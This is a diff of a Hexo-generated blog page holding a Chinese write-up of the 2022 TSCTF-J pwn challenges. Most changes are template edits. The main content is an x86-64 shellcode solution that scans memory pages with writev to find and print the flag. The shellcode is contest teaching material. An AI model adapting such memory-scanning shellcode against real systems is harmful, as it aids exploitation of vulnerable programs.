@@ -3,7 +3,7 @@
 
 
 <head>
-    <meta charset="utf-8">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
     <meta name="keywords" content="2022TSCTF-J, 翰青HanQi&#39;s Blog">
     <meta name="description" content="2022北邮新生赛">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -52,12 +52,12 @@
 
 <meta name="generator" content="Hexo 6.3.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/atom.xml" title="翰青HanQi's Blog" type="application/atom+xml">
-</head>
+<link rel="alternate" href="/atom.xml" title="翰青HanQi's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
 <body>
-    <header class="navbar-fixed">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
     <nav id="headNav" class="bg-color nav-transparent">
         <div id="navContainer" class="nav-wrapper container">
             <div class="brand-logo">
@@ -420,9 +420,6 @@
         <hr class="clearfix">
 
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
-        
 
         
 
@@ -461,45 +458,11 @@
 </ul>
 </li>
 </ul>
-<h3 id="附上官方wp"><a href="#附上官方wp" class="headerlink" title="附上官方wp"></a>附上官方wp</h3>  <pre class="line-numbers language-python" data-language="python"><code class="language-python">sc <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
-lea rsp, [rip+0x500]
-lea r13, [rip]
-mov r14, 0xfffffff00000 
-and r13, r14 # 使r13页对齐
-loop:
-	add r13, 0x1000
-	pop r14 #回收上一次push的r13地址
-	pop r14
-	push 0x1 #因为writev的参数是一个结构体iovec，这里的1表示iov_len
-	push r13
-	mov rdi, 2
-	mov rsi, rsp
-	mov rdx, 1
-	mov rcx, 0
-	mov rax, 20
-	syscall
-	cmp rax, 0  #判断writev的返回值是否为负数，即该页是否可读
-	jl loop # 若不可读再次循环
-mov rdi, [r13]
-cmp edi, 0x54435354 #判断字符串是否以TSCT开头
-jnz loop
-push 31
-push r13
-mov rdi, 2
-mov rsi, rsp
-mov rdx, 1
-mov rcx, 0
-mov rax, 20
-syscall #打印flag
-jmp $
-"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="附上官方wp"><a href="#附上官方wp" class="headerlink" title="附上官方wp"></a>附上官方wp</h3><p>  ```python<br>sc = “””<br>lea rsp, [rip+0x500]<br>lea r13, [rip]<br>mov r14, 0xfffffff00000<br>and r13, r14 # 使r13页对齐<br>loop:<br>  add r13, 0x1000<br>  pop r14 #回收上一次push的r13地址<br>  pop r14<br>  push 0x1 #因为writev的参数是一个结构体iovec，这里的1表示iov_len<br>  push r13<br>  mov rdi, 2<br>  mov rsi, rsp<br>  mov rdx, 1<br>  mov rcx, 0<br>  mov rax, 20<br>  syscall<br>  cmp rax, 0  #判断writev的返回值是否为负数，即该页是否可读<br>  jl loop # 若不可读再次循环<br>mov rdi, [r13]<br>cmp edi, 0x54435354 #判断字符串是否以TSCT开头<br>jnz loop<br>push 31<br>push r13<br>mov rdi, 2<br>mov rsi, rsp<br>mov rdx, 1<br>mov rcx, 0<br>mov rax, 20<br>syscall #打印flag<br>jmp $<br>“””</p>
+</li>
+</ul>
+<p>```<br>    - ### question<br>        这个地方的文件描述符错误应该是2，系统调用可用writev<br>          <img src="https://i.niupic.com/images/2022/10/17/a9tu.png"><br>        - ## 堆相关<br>          其实之前有花时间看过堆的内容，可是太多而且不好理解，看了啥也没记住，下去得好好学一下</p>
 <ul>
-<li><h3 id="question"><a href="#question" class="headerlink" title="question"></a>question</h3>  这个地方的文件描述符错误应该是2，系统调用可用writev<br><img src="https://i.niupic.com/images/2022/10/17/a9tu.png"><ul>
-<li><h2 id="堆相关"><a href="#堆相关" class="headerlink" title="堆相关"></a>堆相关</h2>其实之前有花时间看过堆的内容，可是太多而且不好理解，看了啥也没记住，下去得好好学一下</li>
-</ul>
-</li>
-</ul>
-</li>
 <li><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>光搁pwn坐牢了，其实web学的时间比pwn更长，结果一题没出<br>感觉pwn找资料好难，有没有啥blog分享一下<br>最后引一段从0到1的话，好好去学pwn的基础<br><img src="https://i.niupic.com/images/2022/10/17/a9tT.png"></li>
 <li></li>
 <li></li>
@@ -995,9 +958,6 @@ jmp $
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
 
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
-
 
 <!-- 代码语言 -->
 
@@ -1441,7 +1401,7 @@ $(function () {
     
 
     
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
     
 
 </body>
